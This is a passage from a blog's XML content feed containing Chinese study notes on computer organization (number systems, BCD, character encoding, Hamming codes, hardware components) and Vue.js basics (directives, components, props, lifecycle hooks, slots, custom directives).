        <content type="html"><![CDATA[<blockquote><p>第二章 数据的表示和运算</p></blockquote><ul><li>数据如何在计算机中表示？</li><li>运算器如何实现数据的算数、逻辑运算？</li></ul><hr><h2 id="进位计数制"><a href="#进位计数制" class="headerlink" title="进位计数制"></a>进位计数制</h2><ul><li><strong>十进制、二进制、八进制、十六进制</strong><ul><li>十进制：逢十进一</li><li>二进制：逢二进一</li><li>八进制：逢八进一</li><li>十六进制：逢十六进一</li></ul></li><li><strong>其他进制 &#x3D;&#x3D;&#x3D;&gt; 十进制</strong>  <em><strong>r进制</strong></em><br>   <img src="/images/pasted-82.png" class="lazyload" data-srcset="/images/pasted-82.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>   <img src="/images/pasted-83.png" class="lazyload" data-srcset="/images/pasted-83.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful">   </li><li><strong>二进制、八进制、十六进制之间的相互转换</strong><br>  <img src="/images/pasted-84.png" class="lazyload" data-srcset="/images/pasted-84.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>   <img src="/images/pasted-85.png" class="lazyload" data-srcset="/images/pasted-85.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li><li><strong>十进制 &#x3D;&#x3D;&#x3D;&gt; 其他进制</strong><br>  <img src="/images/pasted-86.png" class="lazyload" data-srcset="/images/pasted-86.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>   <img src="/images/pasted-87.png" class="lazyload" data-srcset="/images/pasted-87.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li><li><strong>真值和机器数</strong><ul><li>真值：符合人类习惯的数字</li><li>机器数：数字实际存到机器里的形式，正负号需要被“数字化”</li></ul></li><li><strong>知识回顾与重要考点</strong><br>  <img src="/images/pasted-88.png" class="lazyload" data-srcset="/images/pasted-88.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul><h2 id="BCD码"><a href="#BCD码" class="headerlink" title="BCD码"></a>BCD码</h2><h3 id="8421码-加法"><a href="#8421码-加法" class="headerlink" title="8421码 加法"></a>8421码 加法</h3><blockquote><p>当结果不在映射表中时，需要+6(0110)进行修正</p></blockquote><pre><code>![upload successful](/images/pasted-89.png)</code></pre><h4 id="知识回顾与重要考点"><a href="#知识回顾与重要考点" class="headerlink" title="知识回顾与重要考点"></a>知识回顾与重要考点</h4><pre><code>![upload successful](/images/pasted-90.png)</code></pre><h2 id="字符与字符串"><a href="#字符与字符串" class="headerlink" title="字符与字符串"></a>字符与字符串</h2><blockquote><p>英文字符 &#x3D;&#x3D;&#x3D;&gt; ASCII码</p></blockquote><h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p><img src="/images/pasted-92.png" class="lazyload" data-srcset="/images/pasted-92.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><img src="/images/pasted-91.png" class="lazyload" data-srcset="/images/pasted-91.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="中文字符"><a href="#中文字符" class="headerlink" title="中文字符"></a>中文字符</h3><blockquote><p>汉字的表示和编码</p></blockquote><p><img src="/images/pasted-93.png" class="lazyload" data-srcset="/images/pasted-93.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p><img src="/images/pasted-94.png" class="lazyload" data-srcset="/images/pasted-94.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="知识回顾与重要考点-1"><a href="#知识回顾与重要考点-1" class="headerlink" title="知识回顾与重要考点"></a>知识回顾与重要考点</h4><p><img src="/images/pasted-95.png" class="lazyload" data-srcset="/images/pasted-95.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="海明码求解步骤"><a href="#海明码求解步骤" class="headerlink" title="海明码求解步骤"></a>海明码求解步骤</h3><p><img src="/images/pasted-96.png" class="lazyload" data-srcset="/images/pasted-96.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>纠错<br>   <img src="/images/pasted-97.png" class="lazyload" data-srcset="/images/pasted-97.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul><h4 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h4><p><img src="/images/pasted-98.png" class="lazyload" data-srcset="/images/pasted-98.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统的层次结构</title>
      <link href="/51751.html"/>
      <url>/51751.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>计算机系统的层次结构</p></blockquote><p><img src="/images/pasted-79.png" class="lazyload" data-srcset="/images/pasted-79.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="知识回顾与重要考点"><a href="#知识回顾与重要考点" class="headerlink" title="知识回顾与重要考点"></a>知识回顾与重要考点</h3><p><img src="/images/pasted-80.png" class="lazyload" data-srcset="/images/pasted-80.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><p><img src="/images/pasted-81.png" class="lazyload" data-srcset="/images/pasted-81.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机硬件的工作原理</title>
      <link href="/18947.html"/>
      <url>/18947.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>计算机各个硬件的工作原理</p></blockquote><ul><li>内部细节</li></ul><p><img src="/images/pasted-69.png" class="lazyload" data-srcset="/images/pasted-69.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="主存储器的基本组成"><a href="#主存储器的基本组成" class="headerlink" title="主存储器的基本组成"></a>主存储器的基本组成</h3><h4 id="主存储器结构"><a href="#主存储器结构" class="headerlink" title="主存储器结构"></a>主存储器结构</h4><p><img src="/images/pasted-70.png" class="lazyload" data-srcset="/images/pasted-70.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>存储体 – 数据在存储体内按地址存储<ul><li>存储单元：每个存储单元存放一串二进制代码；每个地址对应一个存储单元</li><li>存储字（word）：存储单元中二进制代码的组合</li><li>存储字长存储单元中二进制代码的位数</li><li>存储元：即存储二进制的电子元件，每个存储元可存1bit</li></ul></li><li>MAR(Memory Address Register) 存储地址寄存器<ul><li>MAR位数反应存储单元的个数</li><li>MAR &#x3D; 4位 &#x3D;&#x3D;&gt; 总共有2^4个存储单元</li></ul></li><li>MDR(Memory Data Register) 存储数据寄存器<ul><li>MDR位数 &#x3D; 存储字长</li><li>MDR &#x3D; 16位 &#x3D;&#x3D;&gt; 每个 存储单元可存放16bit；1个字（word）&#x3D; 16bit</li></ul></li></ul><h3 id="运算器的基本组成"><a href="#运算器的基本组成" class="headerlink" title="运算器的基本组成"></a>运算器的基本组成</h3><blockquote><p>运算器用于实现算术运算（如：加减乘除）、逻辑运算（如：与或非）</p></blockquote><h4 id="运算器结构"><a href="#运算器结构" class="headerlink" title="运算器结构"></a>运算器结构</h4><p><img src="/images/pasted-71.png" class="lazyload" data-srcset="/images/pasted-71.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>ACC：累加器，用于存放操作数，或运算结果</li><li>MQ：乘商寄存器，在乘、除运算时，用于存放操作数或运算结果</li><li>X：通用的操作数寄存器，用于存放操作数</li><li>ALU：算术逻辑单元，通过内部复杂的电路实现算数运算、逻辑运算</li></ul><p><img src="/images/pasted-72.png" class="lazyload" data-srcset="/images/pasted-72.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="控制器的基本组成"><a href="#控制器的基本组成" class="headerlink" title="控制器的基本组成"></a>控制器的基本组成</h3><h4 id="控制器结构"><a href="#控制器结构" class="headerlink" title="控制器结构"></a>控制器结构</h4><p><img src="/images/pasted-73.png" class="lazyload" data-srcset="/images/pasted-73.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>CU(Control Unit)：控制单元，分析指令，给出控制信号</li><li>IR(Instruction Register)：指令寄存器，存放当前执行的指令</li><li>PC(Program Counter)：程序计数器，存放下一条指令地址，有自动加1功能</li></ul><h3 id="计算机的工作过程"><a href="#计算机的工作过程" class="headerlink" title="计算机的工作过程"></a>计算机的工作过程</h3><p><img src="/images/pasted-75.png" class="lazyload" data-srcset="/images/pasted-75.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="知识回顾与重要考点"><a href="#知识回顾与重要考点" class="headerlink" title="知识回顾与重要考点"></a>知识回顾与重要考点</h3><p><img src="/images/pasted-78.png" class="lazyload" data-srcset="/images/pasted-78.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="冯·诺伊曼计算机的特点"><a href="#冯·诺伊曼计算机的特点" class="headerlink" title="冯·诺伊曼计算机的特点"></a>冯·诺伊曼计算机的特点</h3><ol><li>计算机有五大部分组成</li><li>指令和数据以同等地位存于存储器，可按地址寻访</li><li>指令和数据用二进制表示</li><li>指令由操作码和地址码组成</li><li>存储程序</li><li>以运算器为中心（现在一般以存储器为中心）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机组成 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-day01</title>
      <link href="/15312.html"/>
      <url>/15312.html</url>
      
        <content type="html"><![CDATA[<h2 id="vue特性"><a href="#vue特性" class="headerlink" title="vue特性"></a>vue特性</h2><h3 id="数据驱动视图"><a href="#数据驱动视图" class="headerlink" title="数据驱动视图"></a>数据驱动视图</h3><p>在使用了vue的页面中，vue会监听数据的变化，从而自动重新渲染页面的结构。<br>· 数据驱动视图是单向的数据绑定</p><h3 id="双向数据绑定"><a href="#双向数据绑定" class="headerlink" title="双向数据绑定"></a>双向数据绑定</h3><p><img src="/images/pasted-29.png" class="lazyload" data-srcset="/images/pasted-29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="mvvm"><a href="#mvvm" class="headerlink" title="mvvm"></a>mvvm</h3><p><img src="/images/pasted-30.png" class="lazyload" data-srcset="/images/pasted-30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>mvvm工作原理</li></ul><p><img src="/images/pasted-31.png" class="lazyload" data-srcset="/images/pasted-31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><ul><li>内容渲染指令</li></ul><p><img src="/images/pasted-32.png" class="lazyload" data-srcset="/images/pasted-32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code>+ v-text会覆盖原有内容+ `&#123;&#123;&#125;&#125;`--插值表达式，不会覆盖原有内容+ v-html 渲染包含html标签的字符串</code></pre><ul><li><p>属性绑定指令</p><ul><li>v-bind: 简写为:</li></ul></li><li><p>事件绑定指令</p><ul><li>v-on指令或者@</li></ul></li><li><p>事件修饰符</p></li></ul><p><img src="/images/pasted-33.png" class="lazyload" data-srcset="/images/pasted-33.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>    + @click.prevent&#x3D;xxx()</p><ul><li>按键修饰符</li></ul><p><img src="/images/pasted-34.png" class="lazyload" data-srcset="/images/pasted-34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>v-model指令的修饰符</li></ul><p><img src="/images/pasted-35.png" class="lazyload" data-srcset="/images/pasted-35.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li><p>v-if：动态创建或移除元素，实现元素的显示和隐藏</p><ul><li>如果刚进入页面，某些元素默认不需要被展示，而且后期这个元素很可能也不需要被展示出来，此时v-if性能更好</li></ul></li><li><p>v-show：动态添加或移除<code>display:none</code>样式来实现元素的显示和隐藏</p><ul><li>如果需要频繁的切换元素的显示状态，使用v-show性能会更好</li></ul></li><li><p>列表渲染指令</p><ul><li>v-for：官方建议，只要用到v-for指令，那么一定要绑定一个 :key 属性；而且尽量把id作为key的值</li></ul></li></ul><p><img src="/images/pasted-37.png" class="lazyload" data-srcset="/images/pasted-37.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue-day05</title>
      <link href="/63697.html"/>
      <url>/63697.html</url>
      
        <content type="html"><![CDATA[<h3 id="vue-day05"><a href="#vue-day05" class="headerlink" title="vue-day05"></a>vue-day05</h3><h4 id="动态组件"><a href="#动态组件" class="headerlink" title="动态组件"></a>动态组件</h4><ul><li><p>component标签是vue内置的，作用：组建的占位符</p></li><li><p>is 属性的值，表示要渲染的组件的名字</p></li><li><p>is 属性的值，应该是组件在components节点下注册名称<br><img src="/images/pasted-57.png" class="lazyload" data-srcset="/images/pasted-57.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>当组件第一次被创建的时候，既会执行created生命周期，也会执行activated生命周期</p></li><li><p>当组件被激活的时候，只会触发activated生命周期，不再触发created，因为组件没有被重新创建</p></li></ul><h4 id="keep-alive-的-include属性"><a href="#keep-alive-的-include属性" class="headerlink" title="keep-alive 的 include属性"></a>keep-alive 的 include属性</h4><ul><li>keep-alive 可以把内部的组件进行缓存，而不是销毁组件</li><li>include属性用来指定：只有名称匹配的组件会被缓存。多个组件之间使用英文逗号分隔<br><img src="/images/pasted-58.png" class="lazyload" data-srcset="/images/pasted-58.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li><li>通过exclude属性指定哪些组件不需要被缓存；但是不要同时使用include和exclude这两个属性</li></ul><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><ul><li>如果在“声明组件”的时候，没有为组件指定name名称，则组件的名称默认就是“注册的时候的名称”</li><li>当提供了 name 属性之后，组件的名称就是 name 属性的值</li><li>对比：<br>  1. 组件的“注册名称”的主要应用场景：以标签的形式，把注册好的组件，渲染和使用到页面结构之中<br>  2. 组件声明时候的“name”名称的主要应用场景：结合<keep-alive>标签实现组件缓存功能；以及在调试工具中看到组件的 name 名称</li></ul><h4 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h4><ul><li><p>插槽(Slot)是vue为组件的封装者提供的能力。允许开发者在封装组件时，把不确定、希望由用户指定的部分定义为插槽<br><img src="/images/pasted-59.png" class="lazyload" data-srcset="/images/pasted-59.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>vue官方规定：每一个slot插槽，都要有一个 name 名称</p></li><li><p>如果省略了slot的 name 属性，则有一个默认名称叫做default</p></li><li><p>默认情况下，在使用组件的时候，提供的内容都会被填充到名称为default 的插槽之中<br><img src="/images/pasted-60.png" class="lazyload" data-srcset="/images/pasted-60.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>v-slot指令<br>   1. 如果要把内容填充到指定名称的插槽中，需要使用v-slot: 这个指令<br>   2. v-slot: 后面要跟上插槽名称<br>   3. v-slot: 指令不能直接用在元素身上，必须用在template标签上<br>   4. template是一个虚拟的标签，只起到包裹性质的作用，但是，不会被渲染为任何实质性的 html 元素<br><img src="/images/pasted-61.png" class="lazyload" data-srcset="/images/pasted-61.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>   5. v-slot: 指令的简写形式是 #</p></li><li><p>后备内容<br>   + 封装组件时，可以为预留的<slot>插槽提供后备内容（默认内容）。如果组件的使用者没有为插槽提供任何内容，则后备内容会生效<br><img src="/images/pasted-62.png" class="lazyload" data-srcset="/images/pasted-62.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>具名插槽</p></li><li><p>作用域插槽</p><ul><li>在封装组件时，为预留的<slot>提供属性对应的值，这种做法叫做“作用域插槽”</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue-day06</title>
      <link href="/63889.html"/>
      <url>/63889.html</url>
      
        <content type="html"><![CDATA[<h3 id="vue-day06"><a href="#vue-day06" class="headerlink" title="vue-day06"></a>vue-day06</h3><ul><li>私有自定义指令</li></ul><h4 id="如何创建自定义指令"><a href="#如何创建自定义指令" class="headerlink" title="如何创建自定义指令"></a>如何创建自定义指令</h4><p><img src="/images/pasted-63.png" class="lazyload" data-srcset="/images/pasted-63.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="定义并使用自定义指令"><a href="#定义并使用自定义指令" class="headerlink" title="定义并使用自定义指令"></a>定义并使用自定义指令</h4><p><img src="/images/pasted-64.png" class="lazyload" data-srcset="/images/pasted-64.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><pre><code>+ 当指令第一次被绑定到元素上的时候会立即触发bind函数+ 形参中的el表示当前指令所绑定到的这个DOM对象</code></pre><h4 id="update函数"><a href="#update函数" class="headerlink" title="update函数"></a>update函数</h4><p><img src="/images/pasted-65.png" class="lazyload" data-srcset="/images/pasted-65.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>    + bind函数只调用一次：当指令第一次绑定到元素时调用，当DOM更新时bind函数不会被触发。update函数会在每次DOM更新时被调用</p><h4 id="函数简写"><a href="#函数简写" class="headerlink" title="函数简写"></a>函数简写</h4><p><img src="/images/pasted-66.png" class="lazyload" data-srcset="/images/pasted-66.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><ul><li>如果bind和update函数中的逻辑完全相同，则对象格式的自定义指令可以简写成函数格式</li></ul><h4 id="全局自定义指令"><a href="#全局自定义指令" class="headerlink" title="全局自定义指令"></a>全局自定义指令</h4><ul><li>全局共享的自定义指令需要通过”Vue.directive()”进行声明<br><img src="/images/pasted-67.png" class="lazyload" data-srcset="/images/pasted-67.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul><h4 id="eslint"><a href="#eslint" class="headerlink" title="eslint"></a>eslint</h4><p>p168</p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue-day04</title>
      <link href="/14352.html"/>
      <url>/14352.html</url>
      
        <content type="html"><![CDATA[<h3 id="vue-day04"><a href="#vue-day04" class="headerlink" title="vue-day04"></a>vue-day04</h3><h4 id="组件之间的样式冲突问题"><a href="#组件之间的样式冲突问题" class="headerlink" title="组件之间的样式冲突问题"></a>组件之间的样式冲突问题</h4><ul><li>默认情况下，写在.vue组件中的样式会全局生效，因此很容易造成多个组件之间的样式冲突问题</li><li>导致组件之间样式冲突的根本原因是：<ul><li>单页面应用程序中，所有组件的DOM结构，都是基于唯一的index.html页面进行呈现的</li><li>每个组件中的样式，都会影响整个index.html页面中的DOM元素<br>    + 通过scoped来解决样式冲突<br>    + 当使用第三方组件库的时候，如果有修改第三方组件默认样式的需求，需要用到 &#x2F;deep&#x2F;</li></ul></li></ul><h4 id="组件的生命周期"><a href="#组件的生命周期" class="headerlink" title="组件的生命周期"></a>组件的生命周期</h4><ul><li><p>生命周期是指一个组件从创建 &#x3D;&gt; 运行 &#x3D;&gt; 销毁的整个阶段，强调的是一个时间段</p></li><li><p>组件生命周期函数的分类<br><img src="/images/pasted-52.png" class="lazyload" data-srcset="/images/pasted-52.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>created 生命周期函数</p><ul><li>经常在created中调用methods中的方法，请求服务器的数据，并且把请求到的数据转存到data中，供template模板渲染的时候使用</li></ul></li><li><p>mounted 生命周期函数</p><ul><li>操作页面DOM结构可在mounted函数中进行</li></ul></li><li><p>updated 生命周期函数</p><ul><li>当数据变化之后，为了能够操作到最新的 DOM 结构，必须把代码写到 updated 生命周期函数</li></ul></li></ul><h4 id="组件之间的数据共享"><a href="#组件之间的数据共享" class="headerlink" title="组件之间的数据共享"></a>组件之间的数据共享</h4><ul><li><p>自定义属性：props来接收父向子传递过来的数据</p></li><li><p>子组件向父组件传值<br><img src="/images/pasted-53.png" class="lazyload" data-srcset="/images/pasted-53.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>兄弟组件之间的数据共享</p><ul><li><p>在vue 2.x中，兄弟组件之间数据共享的方案时EventBus<br><img src="/images/pasted-54.png" class="lazyload" data-srcset="/images/pasted-54.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>EventBus 的使用步骤</p></li></ul></li></ul><p>   1.创建eventBus.js模块，并向外共享一个Vue实例对象<br>    2.在数据发送方，调用bus.$emit(‘事件名称’，要发送的数据)方法触发自定义事件<br>      3.在数据接收方，调用bus.$on(‘事件名称’，事件处理函数)方法注册一个自定义事件</p><h4 id="ref引用"><a href="#ref引用" class="headerlink" title="ref引用"></a>ref引用</h4><ul><li>组件的$nextTick(cb)方法，会把cb推迟到下一个DOM更新周期之后执行。通俗的理解是：等组件的DOM更新完成之后，再执行cb回调函数，从而保证cb回调函数可以操作到最新的DOM元素</li></ul><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><ul><li>forEach循环一旦开始，无法在中间被停止</li><li>arr.some(){} 可在中间停止循环，节省性能</li><li>判断数组中水果是否被全选可用arr.every()<br><img src="/images/pasted-55.png" class="lazyload" data-srcset="/images/pasted-55.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li><li>reduce()累加器使用方法<br><img src="/images/pasted-56.png" class="lazyload" data-srcset="/images/pasted-56.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue-day03</title>
      <link href="/64081.html"/>
      <url>/64081.html</url>
      
        <content type="html"><![CDATA[<h3 id="vue-day03"><a href="#vue-day03" class="headerlink" title="vue-day03"></a>vue-day03</h3><ul><li>vue运行流程：通过main.js把App.vue渲染到index.html的指定区域中<ul><li>其中：<br>    1. app.vue用来编写待渲染的模板结构<br>    2. index.html中需要预留一个el区域<br>    3. main.js把App.vue渲染到了index.html所预留的区域中</li></ul></li></ul><h4 id="vue项目中src目录的构成"><a href="#vue项目中src目录的构成" class="headerlink" title="vue项目中src目录的构成"></a>vue项目中src目录的构成</h4><ul><li>assets 文件夹：存放项目中用到的静态资源文件。例如：css样式表、图片资源</li><li>components文件夹：自己封装的、可复用的组件</li><li>main.js 是项目的入口文件，整个项目的运行，要先执行main.js</li></ul><h4 id="组件化开发"><a href="#组件化开发" class="headerlink" title="组件化开发"></a>组件化开发</h4><ul><li><p>组件化开发：根据封装的思想，把页面上可重用的UI结构封装为组件，从而方便项目的开发和维护</p></li><li><p>vue组件的三个组成部分</p><ol><li>template &#x3D;&gt; 组件的模板结构</li><li>script &#x3D;&gt; 组件Javascript行为</li><li>style &#x3D;&gt; 组件的样式</li></ol></li><li><p>使用组件的三个步骤</p><ol><li>使用import语法导入需要的组件<br>2.使用components节点注册组件<br>3.以标签形式使用刚才注册的组件<br><img src="/images/pasted-46.png" class="lazyload" data-srcset="/images/pasted-46.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ol></li><li><p>通过components注册的是私有子组件</p></li><li><p>注册全局组件</p><ul><li>在vue项目中的main.js入口文件中，通过Vue.component()方法，可以注册全局组件 <br><img src="/images/pasted-47.png" class="lazyload" data-srcset="/images/pasted-47.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul></li><li><p>组件的props</p><ul><li><p>props是组件的自定义属性，在封装通用组件的时候，合理地使用props可以极大的提高组件的复用性<br><img src="/images/pasted-48.png" class="lazyload" data-srcset="/images/pasted-48.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>props是只读的</p></li></ul></li></ul><p>    <br><img src="/images/pasted-49.png" class="lazyload" data-srcset="/images/pasted-49.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code>+ props的default默认值</code></pre><p><img src="/images/pasted-50.png" class="lazyload" data-srcset="/images/pasted-50.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code>+ props的type值类型</code></pre><p><img src="/images/pasted-51.png" class="lazyload" data-srcset="/images/pasted-51.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code>+ props的required必填项校验 </code></pre>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue-day02</title>
      <link href="/14992.html"/>
      <url>/14992.html</url>
      
